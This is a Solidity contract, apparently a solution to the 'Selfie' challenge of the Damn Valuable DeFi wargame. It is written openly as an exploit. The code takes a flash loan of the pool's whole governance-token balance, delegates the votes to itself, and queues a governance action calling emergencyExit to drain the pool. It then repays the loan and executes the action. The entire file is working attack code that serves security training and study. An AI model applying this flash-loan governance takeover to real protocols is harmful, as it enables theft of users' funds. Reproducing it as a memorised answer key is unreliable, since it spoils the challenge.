// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {DamnValuableVotes} from "../DamnValuableVotes.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {SelfiePool} from "./SelfiePool.sol";

contract SelfieAttack is IERC3156FlashBorrower {
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    
    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableVotes token;
    address recovery;
    uint256 public actionId;

    constructor(address _pool, address _governance, address _token, address _recovery) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableVotes(_token);
        recovery = _recovery;
    }

    function attack() external {
        uint256 amount = token.balanceOf(address(pool));
        pool.flashLoan(this, address(token), amount, "");
    }

    function onFlashLoan(address, address, uint256 amount, uint256, bytes calldata)
        external
        returns (bytes32)
    {
        // Delegate voting power to this contract
        token.delegate(address(this));
        
        // Queue governance action to drain pool
        actionId = governance.queueAction(
            address(pool),
            0,
            abi.encodeCall(pool.emergencyExit, (recovery))
        );

        // Approve pool to take tokens back
        token.approve(address(pool), amount);
        
        return CALLBACK_SUCCESS;
    }

    function executeAction() external {
        governance.executeAction(actionId);
    }
}
